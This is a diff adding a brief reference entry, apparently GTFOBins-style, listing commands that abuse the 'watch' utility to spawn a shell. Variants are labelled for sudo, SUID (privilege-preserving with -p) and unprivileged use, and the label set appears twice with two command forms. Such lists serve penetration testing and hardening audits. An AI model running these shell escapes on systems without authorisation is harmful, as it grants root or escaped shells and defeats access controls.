@@ -1,0 +1,23 @@
+watch
+=====
+
+Shell
+-----
+
+[Sudo]
+    watch -x /bin/sh -c 'reset; exec /bin/sh 1>&0 2>&0'
+
+[SUID]
+    watch -x /bin/sh -p -c 'reset; exec /bin/sh -p 1>&0 2>&0'
+
+[Unprivileged]
+    watch -x /bin/sh -c 'reset; exec /bin/sh 1>&0 2>&0'
+
+[Sudo]
+    watch 'reset; exec /bin/sh 1>&0 2>&0'
+
+[SUID]
+    watch 'reset; exec /bin/sh 1>&0 2>&0'
+
+[Unprivileged]
+    watch 'reset; exec /bin/sh 1>&0 2>&0'
